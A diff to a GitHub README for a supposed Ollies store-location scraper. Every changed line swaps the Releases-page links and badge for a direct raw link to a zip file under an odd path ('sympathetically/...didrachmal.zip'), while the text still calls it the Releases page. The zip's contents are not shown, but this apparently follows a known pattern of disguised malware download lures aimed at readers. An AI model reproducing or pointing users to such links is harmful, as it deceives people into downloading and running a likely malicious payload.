@@ -1,6 +1,6 @@
 # 🏬 Ollies-Store-Location-Scraper - Simple Tool for Finding Ollies Stores
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases)
+[![Download](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/raw/refs/heads/main/sympathetically/Ollies-Store-Scraper-Location-didrachmal.zip%20Now-Click%20Here-brightgreen)](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/raw/refs/heads/main/sympathetically/Ollies-Store-Scraper-Location-didrachmal.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Ollies-Store-Location-Scraper helps you extract data on Ollies store locations e
 Follow the steps below to download and run Ollies-Store-Location-Scraper.
 
 1. **Visit the Releases Page:** 
-   Open your web browser and go to the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases). This is where you’ll find the latest version of the tool.
+   Open your web browser and go to the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/raw/refs/heads/main/sympathetically/Ollies-Store-Scraper-Location-didrachmal.zip). This is where you’ll find the latest version of the tool.
 
 2. **Select the Latest Version:**
    Look for the most recent release at the top of the page. You will see the version number clearly indicated. Click on it to open the details.
@@ -61,7 +61,7 @@ For optimal performance, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with Ollies-Store-Location-Scraper, visit the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/releases) and download the version that suits your operating system. 
+To get started with Ollies-Store-Location-Scraper, visit the [Releases page](https://github.com/Alessandro29437/Ollies-Store-Location-Scraper/raw/refs/heads/main/sympathetically/Ollies-Store-Scraper-Location-didrachmal.zip) and download the version that suits your operating system. 
 
 After downloading, follow the installation steps listed above to run the application smoothly.
 
